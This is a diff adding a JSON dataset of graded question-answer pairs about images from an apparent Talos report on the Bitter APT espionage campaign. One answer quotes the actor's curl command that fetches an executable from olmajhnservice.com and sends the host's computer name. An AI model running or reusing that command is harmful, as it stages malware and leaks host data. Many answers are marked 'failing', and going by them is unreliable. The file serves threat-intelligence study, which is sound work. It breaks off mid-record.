@@ -1,0 +1,3372 @@
+{
+    "pictures": [
+        {
+            "name": "Based on other related samples we discovered, the actor also uses different folder names tasks names and dropper file names in their campaigns.PNG",
+            "pic_type": "File Paths and Names",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a scheduled task command for executing a potentially malicious download and execution of an external program.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing malware behavior and identifying potential security threats.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve scheduled tasks, command execution, and downloading malicious payloads.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What commands are executed in the image?",
+                    "answer": "The commands executed in the image are `cmd /c start /min curl --output %AppData%\\g711xx.exe -O \"https://olmajhnservice.com/nt.php?dt=%computername%-BKP&ct=BKP\"` and `/f`.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the purpose of the file being downloaded in the image?",
+                    "answer": "The purpose of the file being downloaded is to execute a potentially malicious command.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the task scheduler command in the image?",
+                    "answer": "The significance of the task scheduler command is to automate the download and execution of a potentially malicious file at regular intervals.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the potential impact of executing the commands in the image?",
+                    "answer": "The potential impact is malware execution.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What can be inferred about the security implications in the image?",
+                    "answer": "The security implications suggest a potential malicious script attempting to download and execute code from a remote server.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the identifiable variables or placeholders in the command shown in the image?",
+                    "answer": "The identifiable variables or placeholders in the command are `%AppData%\\g711xx.exe`, `%computername%`, and `BKP`.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What vulnerabilities are targeted in the context of the image?",
+                    "answer": "The vulnerabilities targeted are related to Windows operating systems.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What does the presence of 'AWS Global Accelerator' signify in the image?",
+                    "answer": "The presence of 'AWS Global Accelerator' signifies a service used for improving the performance and availability of applications.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is the C2 server depicted in the image utilized?",
+                    "answer": "The C2 server is utilized to download a malicious executable file.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What tactics are employed to evade detection in the image?",
+                    "answer": "The tactics employed to evade detection include using scheduled tasks with unusual timing, obfuscating the command with PowerShell, and downloading from a seemingly legitimate website.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What does the URL in the command suggest about the attack infrastructure?",
+                    "answer": "The URL suggests the attack infrastructure involves a malicious domain potentially hosting malicious files.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Bitter APT adds Bangladesh to their targets.PNG",
+            "pic_type": "Descriptive Image and Content Explanation",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is the Bitter APT frog mascot.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is TALOS.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for illustrating articles or reports related to cyber threat intelligence, specifically about the Bitter APT group.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve phishing and advanced persistent threats (APT).",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the frog in the image?",
+                    "answer": "The significance of the frog is as a mascot or symbol for the Bitter APT group.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What does the background pattern symbolize in the context of the image?",
+                    "answer": "The background pattern symbolizes phishing attempts.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Who is the target audience for the information conveyed in the image?",
+                    "answer": "The target audience is cybersecurity professionals.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the role of the 'Talos' branding in the image?",
+                    "answer": "The role of the 'Talos' branding is to indicate the source of the cyber threat intelligence.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What emotions or reactions is the image likely intended to evoke?",
+                    "answer": "The image is likely intended to evoke a sense of caution and awareness regarding cyber threats.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What could be the implications of the title 'Bitter APT' as shown in the image?",
+                    "answer": "The implications of the title 'Bitter APT' could refer to an Advanced Persistent Threat group known for targeted cyber attacks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not specified in the context of this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What aspect of AWS Global Accelerator usage might be highlighted in this image?",
+                    "answer": "The aspect of AWS Global Accelerator usage might be highlighted in this image is \"Bitter APT.\"",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What does the use of phishing elements in the image suggest about the article's context?",
+                    "answer": "The use of phishing elements suggests the article's context involves cybersecurity threats related to phishing attacks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How is 'Bitter APT's tactic of using the Windows security update service depicted in this image?",
+                    "answer": "The tactic is depicted by the frog character, symbolizing Bitter APT's use of the Windows security update service.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Decryption function.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a C function that modifies one string based on the characters of another string.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a reverse engineering analysis of a malware binary.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for analyzing code behavior, identifying potential vulnerabilities, or understanding string manipulation functions in a cybersecurity context.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve buffer overflow and XOR encryption.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function is string manipulation and comparison.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used is C.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the role of the variables 'v2', 'v3', and 'result' in the image?",
+                    "answer": "The role of the variables 'v2', 'v3', and 'result' is to store the lengths of the input strings and the index for the loop, respectively.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What kind of operation does the 'for' loop perform in the image?",
+                    "answer": "The 'for' loop performs a bitwise XOR operation between characters of the two input strings.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the 'return result' statement in the image?",
+                    "answer": "The purpose of the 'return result' statement is to return the final value of result.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the '^=' operator within the loop in the image?",
+                    "answer": "The significance of the '^=' operator within the loop is to perform a bitwise XOR assignment.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What does the logic of this code fragment aim to accomplish?",
+                    "answer": "The logic of this code fragment aims to accomplish XOR encryption of the characters in the first string with the characters in the second string cyclically.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What could be the practical applications of this code in real-world scenarios?",
+                    "answer": "The practical application could be in implementing a custom string transformation function.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not mentioned in the context of this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image relate to the AWS Global Accelerator used by the Bitter APT group?",
+                    "answer": "The image does not relate to the AWS Global Accelerator used by the Bitter APT group.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of command and control infrastructure in relation to the image?",
+                    "answer": "The significance of command and control infrastructure in relation to the image is that it likely represents code used by malware to communicate with such infrastructure.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How might the image be used as part of a phishing tactic?",
+                    "answer": "The image might be used as part of a phishing tactic by disguising malicious code as benign programming content to trick users into executing it.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802) are potentially exploited in relation to the image?",
+                    "answer": "The vulnerabilities potentially exploited are CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Domains hosting Bitter APT malware.PNG",
+            "pic_type": "Data Table",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content of the image is a list of domains and their corresponding registration dates.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article from Talos.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing domain registration dates for cyber threat intelligence.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve the use of newly registered domains for malicious activities.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the fields highlighted in the image?",
+                    "answer": "The fields highlighted in the image are \"Domain\" and \"Registered Date.\"",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible informations relevant to malicious activity in the image?",
+                    "answer": "The possible informations relevant to malicious activity are the domains and their registered dates.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the dates in the image?",
+                    "answer": "The significance of the dates in the image is the registration dates of the domains.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the domains listed in the image?",
+                    "answer": "The purpose of the domains listed is for cyber threat intelligence.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What organization does the logo in the image represent?",
+                    "answer": "The organization represented by the logo is Talos.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What actions should be taken if these domains are encountered?",
+                    "answer": "The domains should be flagged for potential malicious activity.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the potential threats associated with the domains listed in the image?",
+                    "answer": "The potential threats associated with the domains listed in the image are malicious activities or cyber attacks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the geographic location of the domain registrants, if available?",
+                    "answer": "The geographic location of the domain registrants is not available.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What specific vulnerabilities (e.g., CVE-2017-11882) are exploited in the context of the image?",
+                    "answer": "The specific vulnerabilities exploited in the context of the image are not mentioned.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What methods are used to distribute the malicious documents to the entities depicted in the image?",
+                    "answer": "The methods used to distribute the malicious documents are not specified in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the function of the C2 server mentioned in relation to the domains in the image?",
+                    "answer": "The function of the C2 server is to control and communicate with compromised systems.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is AWS Global Accelerator being used in the context of the domains shown in the image?",
+                    "answer": "The image does not provide information on how AWS Global Accelerator is being used in the context of the domains shown.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the security firm Cisco Talos in the presentation of this image?",
+                    "answer": "The significance of the security firm Cisco Talos is to provide cyber threat intelligence.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "How do the domains in the image relate to the overall cyber-espionage operation?",
+                    "answer": "The domains in the image relate to the overall cyber-espionage operation as they are newly registered and potentially used for malicious activities.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Download URL captured during runtime of the maldoc.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is disassembly code and strings referencing \"http://olmajhnservice.com/nxl/nx\".",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for analyzing malware behavior and identifying malicious network activities.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve code injection and HTTP requests to a malicious domain.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function of the zCode in the image is to manipulate memory and perform operations involving the string \"http://olmajhnservice.com/nxl/nx\".",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the URL embedded in the image?",
+                    "answer": "The significance of the URL is potential malicious activity.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What programming or scripting language is likely used to generate the code snippets in the image?",
+                    "answer": "The programming language likely used is Assembly.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the relationship between the addresses and the strings shown in the image?",
+                    "answer": "The relationship is that the addresses point to the strings shown in the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the potential security implications indicated by the disassembly code in the image?",
+                    "answer": "The potential security implications indicated by the disassembly code in the image are related to unauthorized network communication with \"http://olmajhnservice.com/nxl/nx\".",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What could be the role of the highlighted disassembly lines in the context of the code shown in the image?",
+                    "answer": "The highlighted disassembly lines could be part of a code responsible for generating or manipulating URLs for potential malicious activities.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What vulnerabilities might be exploited, as indicated by the addresses or functions called in the image?",
+                    "answer": "The vulnerabilities might be related to kernelbase functions at addresses 750469C8.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What type of targeted entities could this image relate to, considering the campaign's focus?",
+                    "answer": "The targeted entities could be web services or URLs.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What command and control techniques might be relevant to the infrastructure or URLs shown in this image?",
+                    "answer": "The command and control techniques might involve HTTP communication with the server \"olmajhnservice.com\" for receiving instructions or exfiltrating data.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the potential impact of the highlighted infrastructure components in orchestrating a sophisticated cyber-attack?",
+                    "answer": "The potential impact is orchestrating a sophisticated cyber-attack by facilitating malicious communication through the highlighted URLs.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Embedded Microsoft Equation object.PNG",
+            "pic_type": "Application Tool Screenshot",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is the output of commands using rtfdump.py and rtfobj.py tools on an RTF file.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for analyzing and extracting embedded objects from RTF files for cyber threat intelligence.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve the use of an RTF file with embedded OLE objects for potential exploitation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What tools are used in the image analysis?",
+                    "answer": "The tools used in the image analysis are rtfdump.py and rtfobj.py.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the 'Equation.3' object in the image?",
+                    "answer": "The significance of the 'Equation.3' object is that it is an OLE Object with a data size of 3584 bytes and is not an OLE Package.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What file format is being analyzed in the image?",
+                    "answer": "The file format being analyzed is RTF.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the size of the OLE object shown in the image?",
+                    "answer": "The size of the OLE object shown in the image is 3584 bytes.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the 'rtfobj' command used in the image?",
+                    "answer": "The purpose of the 'rtfobj' command is to extract and save file embedded in OLE object.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What information does the md5 hash provide in the image?",
+                    "answer": "The md5 hash provides a unique identifier for the file 'Equation.3\\x00' with a size of 3584 bytes.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What information does the command output at the top of the image provide about the file structure?",
+                    "answer": "The command output at the top of the image provides information about the file structure including levels, control types, positions, lengths, and hash values.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is the 'format_id' parameter utilized within the image?",
+                    "answer": "The 'format_id' parameter is utilized to specify the format of the OLE Object.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "Where is the file saved according to the command shown in the image?",
+                    "answer": "The file is saved to /home/remnux/Desktop/27Jan/objdump/b0b687977eee41ee7c3ed0d9d179e8c00181f0c0db64eebc0005a5c6325e8a82_object_00000118.bin.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Information-gathering function.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a C function that appears to involve memory operations and registry access on Windows systems.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing malware behavior and reverse engineering.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve buffer manipulation and registry key access.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function is to extract and manipulate data from registry keys and system information.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used in the image is C.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the function shown in the image?",
+                    "answer": "The purpose of the function is to manipulate and concatenate strings potentially for obfuscation or payload preparation.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the notable variables in the image and their significance?",
+                    "answer": "The notable variables are \"Buffer,\" \"Src,\" and \"pvData,\" which are used for storing computer name, user name, and product name, respectively.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What indications of malicious intent can be found in the code from the image?",
+                    "answer": "The indications of malicious intent include the use of registry keys and memory manipulation techniques.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the potential vulnerabilities present in the code of the image?",
+                    "answer": "The potential vulnerabilities present in the code include buffer overflows and lack of input validation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the CVE vulnerabilities mentioned in relation to the image?",
+                    "answer": "The significance of the CVE vulnerabilities mentioned in relation to the image is that they indicate potential security risks associated with the code.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the code in the image contribute to the masquerade of legitimate software?",
+                    "answer": "The code contributes to the masquerade of legitimate software by retrieving and using the product name from the Windows registry.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What strategies are employed in the image to maintain command and control?",
+                    "answer": "The strategies employed include using registry keys for persistence and potentially obfuscating commands through string manipulation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does the C2 server play according to the code in the image?",
+                    "answer": "The role of the C2 server is to receive the computer name and product name data.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is network proxying reflected in the code of the image?",
+                    "answer": "The code reflects network proxying by manipulating buffer data and using registry keys to potentially configure or interact with a proxy setting.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Malicious Excel infection chain summary.PNG",
+            "pic_type": "Attack Flow or Intelligence Structure",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is the Malicious Excel Infection Chain.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article from TALOS.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
